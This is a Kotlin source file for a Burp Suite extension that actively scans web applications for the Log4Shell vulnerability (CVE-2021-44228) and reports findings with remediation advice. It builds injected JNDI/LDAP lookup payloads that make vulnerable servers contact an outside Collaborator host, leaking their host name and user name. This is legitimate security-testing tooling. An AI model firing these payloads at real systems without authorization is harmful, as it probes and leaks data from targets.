/*
 * This file is part of Log4Shell scanner for Burp Suite (https://github.com/silentsignal/burp-piper)
 * Copyright (c) 2021 Andras Veres-Szentkiralyi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

package burp

import java.net.URL
import java.util.*
import java.util.concurrent.ConcurrentHashMap

const val NAME = "Log4Shell scanner"
const val QUERY_HOSTNAME = 'h'
const val QUERY_HOSTUSER = 'u'

class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {

    private lateinit var callbacks: IBurpExtenderCallbacks
    private lateinit var helpers: IExtensionHelpers
    private lateinit var collaborator: IBurpCollaboratorClientContext

    private val crontab: ConcurrentHashMap<String, Pair<IHttpRequestResponse, IntArray>> = ConcurrentHashMap()
    private val thread: Thread = object : Thread() {
        override fun run() {
            try {
                while (true) {
                    sleep(60 * 1000) // 60 seconds -- poll every minute
                    val interactions = collaborator.fetchAllCollaboratorInteractions().groupBy { it.getProperty("interaction_id") }
                    for (entry in interactions.entries) {
                        val payload = entry.key
                        val (hrr, poff) = crontab[payload] ?: continue
                        handleInteractions(listOf(Pair(hrr, poff)), entry.value, sync = false).forEach(callbacks::addScanIssue)
                    }
                }
            } catch (ex: InterruptedException) {
                return
            }
        }
    }

    override fun registerExtenderCallbacks(callbacks: IBurpExtenderCallbacks) {
        this.callbacks = callbacks
        helpers = callbacks.helpers
        collaborator = callbacks.createBurpCollaboratorClientContext()

        callbacks.setExtensionName(NAME)
        callbacks.registerScannerCheck(this)
        callbacks.registerExtensionStateListener(this)
    }

    override fun doPassiveScan(baseRequestResponse: IHttpRequestResponse?): MutableList<IScanIssue> =
            Collections.emptyList() // not relevant

    override fun doActiveScan(baseRequestResponse: IHttpRequestResponse?, insertionPoint: IScannerInsertionPoint?): MutableList<IScanIssue> {
        val context = mutableListOf<Pair<IHttpRequestResponse, IntArray>>()
        val collabResults = mutableListOf<IBurpCollaboratorInteraction>()
        for ((prefix, key) in listOf(Pair(QUERY_HOSTNAME, "hostName"), Pair(QUERY_HOSTUSER, "hostName}-s2u-\${env:USERNAME:-\${env:USER}"))) {
            val payload = collaborator.generatePayload(false)
            val bytes = "\${jndi:ldap://$prefix\${$key}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
            val request = insertionPoint!!.buildRequest(bytes)
            val poff = insertionPoint.getPayloadOffsets(bytes)
            val hs = baseRequestResponse!!.httpService
            crontab[payload] = Pair(EarlyHttpRequestResponse(hs, request), poff) // fallback in case of timeout
            val hrr = callbacks.makeHttpRequest(hs, request)
            val contextPair = Pair(hrr, poff)
            context.add(contextPair)
            collabResults.addAll(collaborator.fetchCollaboratorInteractionsFor(payload))
            crontab[payload] = contextPair
        }
        val interactions = handleInteractions(context, collabResults, sync = true)
        synchronized(thread) {
            if (!thread.isAlive) thread.start()
        }
        return interactions
    }

    class EarlyHttpRequestResponse(private val hs: IHttpService, private val sentRequest: ByteArray) : IHttpRequestResponse {
        override fun getComment(): String = ""
        override fun getHighlight(): String = ""
        override fun getHttpService(): IHttpService = hs
        override fun getRequest(): ByteArray? = sentRequest
        override fun getResponse(): ByteArray? = null
        override fun setComment(comment: String?) {}
        override fun setHighlight(color: String?) {}
        override fun setHttpService(httpService: IHttpService?) {}
        override fun setRequest(message: ByteArray?) {}
        override fun setResponse(message: ByteArray?) {}
    }

    private fun handleInteractions(context: List<Pair<IHttpRequestResponse, IntArray>>,
                                   interactions: List<IBurpCollaboratorInteraction>,
                                   sync: Boolean): MutableList<IScanIssue> {
        if (interactions.isEmpty()) return Collections.emptyList()
        val hrr = context[0].first
        val iri = helpers.analyzeRequest(hrr)
        val markers = context.map { (hrr, poff) ->
            callbacks.applyMarkers(hrr, Collections.singletonList(poff), Collections.emptyList()) as IHttpRequestResponse
        }.toTypedArray()
        return Collections.singletonList(object : IScanIssue {
            override fun getUrl(): URL = iri.url
            override fun getIssueName(): String = "Log4Shell (CVE-2021-44228) - " + (if (sync) "synchronous" else "asynchronous")
            override fun getIssueType(): Int = 0x08000000
            override fun getSeverity(): String = "High"
            override fun getConfidence(): String = "Tentative"
            override fun getIssueBackground(): String = "See <a href=\"https://www.lunasec.io/docs/blog/log4j-zero-day/\">CVE-2021-44228</a>"
            override fun getRemediationBackground(): String? = null
            override fun getRemediationDetail(): String = "Version 2.15.0 of log4j has been released without the vulnerability." +
                    "<br><br><code>log4j2.formatMsgNoLookups=true</code> can also be set as a mitigation on affected versions."
            override fun getHttpMessages(): Array<IHttpRequestResponse> = markers
            override fun getHttpService(): IHttpService = hrr.httpService
            override fun getIssueDetail(): String {
                val sb = StringBuilder("<p>The application interacted with the Collaborator server <b>")
                if (sync) {
                    sb.append("in response to")
                } else {
                    sb.append("some time after")
                }
                sb.append("</b> a request with a Log4Shell payload</p><ul>")

                interactions.map(this::formatInteraction).toSortedSet().forEach { sb.append(it) }

                sb.append("</ul><p>This means that the web service (or another node in the network) is affected by this vulnerability. ")
                sb.append("However, actual exploitability might depend on an attacker-controllable LDAP server being reachable over the network.</p>")
                if (!sync) {
                    sb.append("<p>Since this interaction occurred <b>some time after the original request</b> (compare " +
                            "the <code>Date</code> header of the HTTP response vs. the interactions timestamps above), " +
                            "<b>the vulnerable code might be in another process/codebase or a completely different " +
                            "host</b> (e.g. centralized logging, SIEM). There might even be multiple instances of " +
                            "this vulnerability on different pieces of infrastructure given the nature of the bug.</p>")
                }
                return sb.toString()
            }

            private fun formatInteraction(interaction: IBurpCollaboratorInteraction): String {
                val sb = StringBuilder()
                val type = interaction.getProperty("type")
                if (type == "DNS") {
                    val hostUser = extractHostUser(helpers.base64Decode(interaction.getProperty("raw_query")))
                    if (hostUser == null) {
                        sb.append("<li><b>DNS")
                    } else {
                        val (host, user) = hostUser
                        sb.append("<li>By the host named <b>$host")
                        if (user != null) sb.append("</b> running as user <b>$user")
                    }
                } else {
                    sb.append("<li><b>")
                    sb.append(type)
                }
                sb.append("</b> at <b>")
                sb.append(interaction.getProperty("time_stamp"))
                sb.append("</b> from <b>")
                sb.append(interaction.getProperty("client_ip"))
                sb.append("</b></li>")
                return sb.toString()
            }
        })
    }

    override fun consolidateDuplicateIssues(existingIssue: IScanIssue?, newIssue: IScanIssue?): Int = 0 // TODO could be better

    override fun extensionUnloaded() {
        synchronized(thread) {
            if (thread.isAlive) {
                thread.interrupt()
            }
        }
    }
}

private fun extractHostUser(query: ByteArray): Pair<String, String?>? {
    if (query[4] != 0.toByte() || query[5] != 1.toByte()) return null
    val len = query[12].toInt()
    if (len and 0xc0 != 0) return null
    val decoded = query.decodeToString(startIndex = 13, endIndex = 13 + len)
    if (decoded.startsWith(QUERY_HOSTNAME)) {
        return Pair(decoded.substring(1), null)
    } else if (decoded.startsWith(QUERY_HOSTUSER)) {
        val parts = decoded.substring(1).split("-s2u-")
        if (parts.size != 2) return null
        return Pair(parts[0], parts[1])
    } else return null
}